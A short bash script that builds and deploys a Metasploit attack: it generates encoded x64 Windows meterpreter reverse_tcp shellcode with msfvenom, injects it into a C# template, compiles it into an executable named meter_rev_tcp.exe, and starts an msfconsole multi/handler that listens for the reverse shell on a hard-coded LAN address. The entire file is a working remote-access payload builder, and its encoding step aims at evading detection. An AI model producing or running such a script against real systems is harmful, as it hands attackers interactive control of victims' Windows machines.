#!/bin/bash

## simple payload - x64
DIR=$(pwd)
rvm use ruby-2.5.1

cd /usr/share/metasploit-framework


LHOST=192.168.1.242
DATE=`date +%Y-%m-%d`
LPORT=4445

rm shellcode.cs
CMD="./msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT PrependMigrate=true -e x86/shikata_ga_nai -b '\x00\xFF' -f csharp > shellcode.cs"

echo $CMD
eval $CMD

line=21;  
#sed -e "${line}r shellcode.cs" "$DIR/wrapper.cs" > "$DIR/$template1.cs"  # compile
#mcs -out:"$DIR/meter_rev_tcp.exe" "$DIR/$template1.cs"
sed -e "21r shellcode.cs" "template.cs" > "$template1.cs"  # compile
mcs -out:"meter_rev_tcp.exe" "$template1.cs"
cp meter_rev_tcp.exe "$DIR/"

cat >msf.rc <<EOL
use multi/handler
set payload windows/meterpreter/reverse_tcp
setg LHOST ${LHOST}
set LPORT ${LPORT}
exploit -z -j
EOL
#exit;
./msfconsole -r msf.rc;

#rm msf.rc
#rm $DIR/meter_rev_tcp.exe 


